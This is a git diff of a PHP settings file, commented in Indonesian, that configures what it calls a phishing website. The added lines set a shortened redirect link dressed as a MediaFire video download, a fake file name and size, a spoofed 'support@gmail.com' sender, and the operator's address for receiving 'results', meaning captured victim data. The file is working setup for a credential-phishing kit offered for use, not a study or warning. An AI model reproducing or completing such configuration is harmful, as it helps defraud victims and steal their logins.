@@ -1,7 +1,10 @@
 <?php
 
-// GANTI NAMA WEB DI SETTING.PHP
+$redirect = 'https://bit.ly/mediafire-terbaru'; // LINK DOWNLOAD VIDEO
+$namavideo = 'Nama File'; // NAMA WEB PHISING MU
+$download = '10,1MB'; // UKURAN DOWNLOAD
 
-$alexhost = 'emailmu@gmail.com'; // EMAIL KAMU
+$sender = 'From: Web Arya ThiQo <support@gmail.com>'; // NAMA RESULT MU
+$email = "emailmu@gmail.com"; // GANTI EMAIL MU
 
 ?>
